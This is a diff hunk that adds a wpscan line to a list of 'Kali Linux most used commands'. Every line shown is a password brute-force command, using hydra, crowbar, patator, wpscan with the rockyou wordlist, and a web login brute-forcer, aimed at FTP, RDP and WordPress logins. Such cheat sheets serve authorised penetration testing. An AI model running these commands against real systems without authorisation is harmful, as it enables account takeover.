@@ -15,6 +15,7 @@ KALI LINUX most used commands examples:
 - hydra -L user.txt -P pass.txt ftp://192.168.166.234:21
 - crowbar -b rdp -s 192.168.2.0/24 -U ~/Desktop/userlist -C ~/Desktop/passlist -d
 - python3 web–brutator.py --target standardform --url https://site.com/wp-login.php -u admin -P pass.txt -s -t 40 -v
+- wpscan --url http://192.168.1.100/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
 - instashell #PASSWORDS wordlist
 - patator ftp_login host=10.10.0.50 user=FILE0 password=FILE1 0=usernames.txt 1=passwords.txt
 
